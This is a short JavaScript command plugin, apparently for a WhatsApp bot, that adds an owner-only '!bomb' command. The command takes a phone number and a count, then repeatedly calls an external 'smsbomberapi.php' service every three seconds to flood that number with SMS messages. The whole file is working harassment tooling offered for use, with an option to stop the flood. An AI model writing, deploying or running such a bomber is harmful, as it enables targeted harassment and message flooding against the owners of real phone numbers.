const { cmd } = require('../command');
let isBombing = false;
let bombingInterval;

cmd({
    pattern: "bomb",
    react: "💣",
    desc: "Start/Stop SMS bombing",
    category: "main",
    filename: __filename
}, async (conn, mek, m, { from, isOwner, text }) => {
    if (!isOwner) return reply("❌ Owner only!");

    const args = text.split(' ');
    const number = args[1]?.replace('@s.whatsapp.net', '');

    // STOP Logic
    if (isBombing) {
        clearInterval(bombingInterval);
        isBombing = false;
        return reply("✅ Bombing stopped!");
    }

    // START Logic
    if (!number) return reply("Usage: !bomb 92300 [count=10]");
    const count = args[2] || 10; // Default: 10 SMS

    isBombing = true;
    let sent = 0;
    reply(`💣 Bombing STARTED on ${number} (${count} SMS)`);

    bombingInterval = setInterval(async () => {
        if (!isBombing || sent >= count) {
            clearInterval(bombingInterval);
            isBombing = false;
            return;
        }
        
        await fetch(`https://shadowscriptz.xyz/shadowapisv4/smsbomberapi.php?number=${number}`);
        sent++;
    }, 3000); // 3-second delay
});
